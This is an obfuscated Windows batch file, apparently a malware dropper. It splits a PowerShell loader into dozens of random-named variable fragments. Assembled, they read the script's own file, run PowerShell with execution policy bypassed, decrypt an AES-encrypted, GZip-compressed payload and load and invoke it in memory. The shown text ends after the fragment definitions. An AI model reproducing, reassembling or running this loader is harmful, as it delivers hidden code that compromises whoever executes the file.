@echo off
set "bjisxedTtg=[IO."
set "KYkTpqLiWz=ose("
set "BpIpqGqZks=stem"
set "QxdhpcLxPb=-ep "
set "bpCTqBlwYO=)))"
set "AwLKwFMTvZ=edqg"
set "cnaAbGkzYH=.IO."
set "RjeOZZeNju=comm"
set "IboBBgNNdw=sDMN"
set "uKoyIGPYXf=tryP"
set "qrfbpwsqDZ=pStr"
set "cYlJiFKtga=ispo"
set "bbuoKykDRG=($ed"
set "wsNRBemEuY=ion."
set "uLgKzoMgNG=U = "
set "QCZBmHHzhO=sDMN"
set "zcJcSeHSYi=trea"
set "eykclVWbPB= = $"
set "IsyHfmflKq=grap"
set "yqmAOpVexc=-joi"
set "eRQsrfVNPs==');"
set "DhPsmoOaRs=  $v"
set "iPNJuVBQQd=.GZi"
set "DowTgfszTJ=s75K"
set "gEFLKlOtSg== $C"
set "znYppHfThJ=onve"
set "KNgHPOiYUp=gMod"
set "bufbAqfMXq=.-16"
set "zKhIrvYvbI=U = "
set "OciLwpZVme= = N"
set "EFpYEVQTdP=nage"
set "LKoVGWNrjg=Invo"
set "wnWNrOTQsa=th('"
set "TVBmGZQqAD=ITVU"
set "UVneErDMKI=ke($"
set "uoHubPHOFS=nirt"
set "apXXqnuHEu=D) {"
set "EwYFZyqhAj=e]::"
set "rtqYbXRgBj=oryS"
set "TmvXNtFCBl=tem."
set "nNsGmbFNMW=[Sys"
set "bzWwpFcbpP=eMVs"
set "KVbGiQpGPA=oin "
set "GCPoflvAVG=[Sys"
set "uWfvYvvEmX=1..-"
set "FChEwhPzzv=JxDT"
set "lbqYfhdGHA=ck($"
set "RNKXAGWqqz=:('g"
set "SlMjsAiRvr='0Pg"
set "CjIXXczMrT=3); "
set "uiVXruMWui=New-"
set "eRnBKzjRnH=106u"
set "waKYzquNMc=esMa"
set "gLndIXCtJF=RmAx"
set "mNdMRHoVbK=.Cop"
set "PeMUqoVUmC=eam("
set "IQCycgcHxc=;$GO"
set "YkjsMDDbYE=oint"
set "DMtdVMiPgX=ddin"
set "xttrbkRCdv=File"
set "JKPiAeZRwL=rity"
set "YCiYWgLJnF=Lu.T"
set "McQYenpigV=crRY"
set "kBWQepceXE=nRTO"
set "YhtVXiVqnf=TllA"
set "hhODeWJWwR=[-1."
set "ESdICTJyeq=tS46"
set "ooBibfPNeY=y.Cr"
set "hcTtMKmCrQ= '')"
set "NbuHkMVoyL=KVS "
set "vTfqoGWRZM=m.IO"
set "kPgvsWsTZi= [Sy"
set "lrXqmDBCNT=raph"
set "mCsTuRajRf=y.Pa"
set "rJOqujesac=ecry"
set "BVeOBIFClp=S46e"
set "RqoHaqXkiz=-4] "
set "UUfKSTrhdY=xDTj"
set "ZYBAJyIZsw='gni"
set "LDWApZlvsA=ptog"
set "dGrJmciqrb=6] -"
set "xZBRIKlSdG=$JxD"
set "hNltkgyWuL=);$C"
set "gKFXCcgSzm=Obje"
set "ShseeTVWqQ=Disp"
set "NjABCeXNhr=bstr"
set "FgUzseJFHJ=nRTO"
set "xiVzxDosjV=rofi"
set "OCWiTVqHrO= if "
set "kUqwXptaiw=);$d"
set "ordeUxivOl=t Sy"
set "heHyzlpLsQ=F'[-"
set "FkvnbTBfCA=$wIT"
set "aZDXTxWsHr=ert]"
set "pXOowfdaRW=sDMN"
set "BmgDsSlhYc=ach "
set "UfAGuZUaht=rRY."
set "tMggdVpcBD=.Con"
set "EObZlHfbrD=, $w"
set "LOCIoYXJAF=orF'"
set "gVQCyDVkZh=y]::"
set "ONWOsxaItX=daeR"
set "GqsvbTeerV=rtS4"
set "vZIYUAXRsw=)($w"
set "aZnIxSmsuY=..-1"
set "IcRUgrquJz=sDMN"
set "YdjUxLCaPI=saBm"
set "imdIPYFMqX=1] -"
set "zgjGQgLufr=u = "
set "aQKUtwFGQI=]::C"
set "vaoWoGZiMO=.Key"
set "qBdlxhBmYE=wITV"
set "lIouPQOdFW=('%~f0'"
set "gjDCwGIJiT=Obje"
set "rMlqROQluy=ing("
set "rttdNkQuMG=iron"
set "UimuifVYTY=pose"
set "qaWvuRUiJA= = ["
set "meLQeEMdsQ=-nop"
set "NQAUYlATWM=)($v"
set "GsCvocsBTh=ptor"
set "nJeFeVxFBo=em.C"
set "cSjwamBKLg=YP.T"
set "mVmhtWNlVI=jLu "
set "GFunbtNDYE=le  "
set "fbsAeKKidF=tion"
set "wIjCJoaKUD= New"
set "CexNHvOQLP=PxEW"
set "IvZwKXCjMk=Fina"
set "JphwVoRNZk=lBlo"
set "aFnrhdDrND=]::("
set "NEVjnXvBMA=pose"
set "prLkqwprzp=ose("
set "CCAqgHCOjK=YP);"
set "SeeRUcJjoZ=();$"
set "bsCdkkALKq=jLu."
set "NabbPdRDhu=fu, "
set "bJaVbJnFdy=ptog"
set "MSIGiTRkGf=BC;$"
set "NQlYldBIMG=raph"
set "lXpkkHxFpW=Secu"
set "RbhrXQUBkh=mory"
set "wUvFiYOplj=n ''"
set "SRDiKZfuPz=and "
set "qktvfOAnrz= '')"
set "YqWGeHPsCC=sDMN"
set "kAuexaMYWB=CFxo"
set "hyWWMSvwMP=ne);"
set "nqLoXIgubj=tem."
set "IdNYVbxhcz=PKCS"
set "WfODfmomFK=('Tg"
set "JoCWnLPoQv=Secu"
set "RunppVOXJm=.Len"
set "RsyIMeQOfx=.Mod"
set "lGAaxBYCLT=bypa"
set "jBzrrfwYZc=join"
set "mvfWQZObLp=;$GO"
set "cGeUAHPlxO=Syst"
set "GKmoQgQais=MN.I"
set "LgLEYEXeiu=m(, "
set "ywfaKvsiuj=VU);"
set "uFAbrMUCBQ=);$J"
set "wiCighXurG=oArr"
set "xgBGmMbViH=L4Yi"
set "GoxKNiUdaf=gWVl"
set "jWRxlldaJt=em.I"
set "xsvQMAmeCB=[Env"
set "SGdcQCxEoc=VU ="
set "SIpbEqakfL=QKYP"
set "QlzsNxYsnL=oL'["
set "BHgtKzawrr=]::("
set "wiqyHeusKN=ring"
set "NwSkHxzZDY=rans"
set "nXhawUvxPa=-joi"
set "KmrLHzNRJd=Efu."
set "uYCFBrDxNk=();$"
set "BiIUgNAnPE=.Ass"
set "aNYgxhPWol=YP ="
set "FbPNotEqJr=$wQK"
set "QsFHLyDycO=stem"
set "BrQSxiGOOl=('%*'"
set "SVDOCMFiQS=16] "
set "josKEkTODQ=fore"
set "SGWSNpcFeE='[-1"
set "pVExwSVgFe=Conv"
set "BKOigesoRR=Star"
set "kTWAjBWDlk=l5E7"
